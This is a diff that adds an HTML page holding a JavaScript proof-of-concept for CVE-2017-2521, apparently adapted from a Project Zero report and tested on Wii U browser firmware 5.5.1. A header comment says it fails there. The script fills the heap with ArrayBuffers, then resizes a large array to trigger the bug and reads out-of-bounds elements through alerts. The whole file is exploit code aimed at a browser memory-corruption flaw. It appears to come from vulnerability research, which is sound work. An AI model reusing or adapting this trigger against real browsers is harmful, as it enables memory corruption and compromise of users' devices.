@@ -1,0 +1,40 @@
+<!--
+CVE-2017-2521
+Tested on 5.5.1
+Based on: https://bugs.chromium.org/p/project-zero/issues/detail?id=1165
+Result: Doesn't work (Likely due to the fact that the Wii U handles memory differently)
+        When the heap fills up it just gives you the option to reload. Also
+        There is a max arraybuffer length.
+-->
+
+<script>
+var kArrayLength = 0x20000;
+
+var arr = new Array(kArrayLength);
+for(var i = 0; i < kArrayLength; i++)
+    arr[i] = {};
+
+var exh = [];
+try {
+    for (;;) {
+        exh.push(new ArrayBuffer(kArrayLength * 8 * 8));
+    }
+} catch (e) {
+    alert("e - "+e);
+}
+
+try {
+    arr.length *= 8;
+    alert('failed');
+} catch (e) {
+    alert(e);
+
+    exh = null;
+
+    alert('arr length: ' + arr.length.toString(16));
+    for (var i = kArrayLength, n = arr.length; i < n; i++) {
+        if (arr[i])
+            alert(arr[i]);
+    }
+}
+</script>
